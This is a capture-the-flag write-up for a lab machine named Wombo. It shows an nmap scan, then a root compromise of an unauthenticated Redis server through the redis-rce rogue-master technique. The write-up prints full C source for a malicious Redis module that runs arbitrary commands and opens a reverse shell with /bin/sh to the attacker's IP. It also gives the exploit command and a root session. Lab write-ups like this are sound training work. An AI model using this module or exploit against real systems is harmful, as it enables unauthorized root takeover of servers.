# CTF Writeup: Wombo

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 03:27 EST
Nmap scan report for 192.168.130.69
Host is up (0.028s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
80/tcp    open   http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
6379/tcp  open   redis      Redis key-value store 5.0.9
8080/tcp  open   http-proxy
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=FKwRVtYIWOxmzozuM4bCm1xI; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-3LBeBw/GpG08oIBPZFPyY6CoClg"
|     Vary: Accept-Encoding
|     Date: Sun, 28 Dec 2025 08:27:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=DzO3s5Jz7a8Y9aUyYojikqfc; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-f1llgy+xDTCpZP0WOFRnb5bV6Mk"
|     Vary: Accept-Encoding
|     Date: Sun, 28 Dec 2025 08:27:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Sun, 28 Dec 2025 08:27:35 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: Home | NodeBB
27017/tcp open   mongodb    MongoDB 4.0.18 4.1.1 - 5.0
| mongodb-info: 
|   MongoDB Build info
|     bits = 64
|     storageEngines
|       0 = devnull
|       3 = wiredTiger
|       2 = mmapv1
|       1 = ephemeralForTest
|     sysInfo = deprecated
|     openssl
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|       running = OpenSSL 1.1.0l  10 Sep 2019
|     javascriptEngine = mozjs
|     ok = 1.0
|     version = 4.0.18
|     buildEnvironment
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       distmod = debian92
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       distarch = x86_64
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       target_os = linux
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       target_arch = x86_64
|     modules
|     maxBsonObjectSize = 16777216
|     versionArray
|       0 = 4
|       3 = 0
|       2 = 18
|       1 = 0
|     debug = false
|     allocator = tcmalloc
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|   Server status
|     codeName = Unauthorized
|     ok = 0.0
|     code = 13
|_    errmsg = command serverStatus requires authentication
| mongodb-databases: 
|   codeName = Unauthorized
|   ok = 0.0
|   code = 13
|_  errmsg = command listDatabases requires authentication
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=12/28%Time=6950E9F8%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,1044,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Control:\x20of
SF:f\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\
SF:nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=
SF:block\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nX-Power
SF:ed-By:\x20NodeBB\r\nset-cookie:\x20_csrf=DzO3s5Jz7a8Y9aUyYojikqfc;\x20P
SF:ath=/\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x2018181\r\nETag:\x20W/\"4705-f1llgy\+xDTCpZP0WOFRnb5bV6Mk\"\r\nVary:
SF:\x20Accept-Encoding\r\nDate:\x20Sun,\x2028\x20Dec\x202025\x2008:27:35\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lan
SF:g=\"en-GB\"\x20data-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20
SF:>\r\n<head>\r\n\t<title>Home\x20\|\x20NodeBB</title>\r\n\t<meta\x20name
SF:=\"viewport\"\x20content=\"width&#x3D;device-width,\x20initial-scale&#x
SF:3D;1\.0\"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/htm
SF:l;\x20charset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-cap
SF:able\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capab
SF:le\"\x20content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_name\"\x20
SF:content")%r(HTTPOptions,1BF,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-C
SF:ontrol:\x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:
SF:\x20noopen\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x
SF:201;\x20mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross-orig
SF:in\r\nX-Powered-By:\x20NodeBB\r\nAllow:\x20GET,HEAD\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag:\x20W/\"8-
SF:ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nVary:\x20Accept-Encoding\r\nDate:\x20S
SF:un,\x2028\x20Dec\x202025\x2008:27:35\x20GMT\r\nConnection:\x20close\r\n
SF:\r\nGET,HEAD")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Connection:\x20close\r\n\r\n")%r(FourOhFourRequest,2D42,"HTTP/1\.1\x204
SF:04\x20Not\x20Found\r\nX-DNS-Prefetch-Control:\x20off\r\nX-Frame-Options
SF::\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nReferrer-Po
SF:licy:\x20strict-origin-when-cross-origin\r\nX-Powered-By:\x20NodeBB\r\n
SF:set-cookie:\x20_csrf=FKwRVtYIWOxmzozuM4bCm1xI;\x20Path=/\r\nContent-Typ
SF:e:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2011098\r\nETag:\
SF:x20W/\"2b5a-3LBeBw/GpG08oIBPZFPyY6CoClg\"\r\nVary:\x20Accept-Encoding\r
SF:\nDate:\x20Sun,\x2028\x20Dec\x202025\x2008:27:36\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en-GB\"\x20data-d
SF:ir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r\n<head>\r\n\t<tit
SF:le>Not\x20Found\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"viewport\"
SF:\x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D;1\.0\"\x20
SF:/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\x20charset
SF:=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capable\"\x20con
SF:tent=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\"\x20conte
SF:nt=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_n");
Aggressive OS guesses: Linux 3.10 - 4.11 (96%), Linux 3.13 - 4.4 (96%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.13 (93%), Linux 3.8 - 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.13 or 4.2 (90%), Linux 4.4 (90%), Synology DiskStation Manager 7.1 (Linux 4.4) (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.01 ms 192.168.45.1
2   27.01 ms 192.168.45.254
3   27.73 ms 192.168.251.1
4   27.98 ms 192.168.130.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.45 seconds
```

## Initial Access & Privilege Escalation

Since we got version information on the redis database & I previously exploited one, I will do the following to achieve RCE:

Downloaded https://github.com/Ridter/redis-rce?tab=readme-ov-file

For me specifically I already have it in /home/saitama/Desktop/Tools/Redis/redis-rce

After that rename it to exp.so and run the exploit with the following Syntax and u'll receive RCE.

## Compile exp.so

Before u can run this exploit u will need to compile an exp.so file.

Which u can get from here:

```
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

Unfortunately the module.c doesn't work, please use the following PoC:

```
#include "redismodule.h"
#include <string.h>  // For strlen, strcat
#include <arpa/inet.h>  // For inet_addr
#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                char *buf, *output;
                buf = (char *)malloc(size);
                output = (char *)malloc(size);
                while ( fgets(buf, sizeof(buf), fp) != 0 ) {
                        if (strlen(buf) + strlen(output) >= size) {
                                output = realloc(output, size<<2);
                                size <<= 1;
                        }
                        strcat(output, buf);
                }
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 3) {
                size_t cmd_len;
                char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
                char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
                int port = atoi(port_s);
                int s;

                struct sockaddr_in sa;
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(ip);
                sa.sin_port = htons(port);

                s = socket(AF_INET, SOCK_STREAM, 0);
                connect(s, (struct sockaddr *)&sa, sizeof(sa));
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                char *args[] = {"/bin/sh", NULL};
                char *env[] = {NULL};
                execve("/bin/sh", args, env);
        }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
          if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
```

And build your module.so file 

```
make
```

change module.so to exp.so

```
mv module.so exp.so
```

Ran the exploit.

```
python3 redis-rce.py -r 192.168.130.69 -p 6379 -L 192.168.45.221 -P 8080 -f exp.so

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.130.69:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.130.69:6379
[*] Setting filename
[+] Accepted connection from 192.168.130.69:6379
[*] Start listening on 192.168.45.221:8080
[*] Tring to run payload
[+] Accepted connection from 192.168.130.69:35161
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i
[+] Interactive shell open , use "exit" to exit...
$ whoami
$ ls
root
```

Gained Root Shell and retrieved proof.txt in /root directory.

```
87a12b35885fc07aa778c14308aac234
```
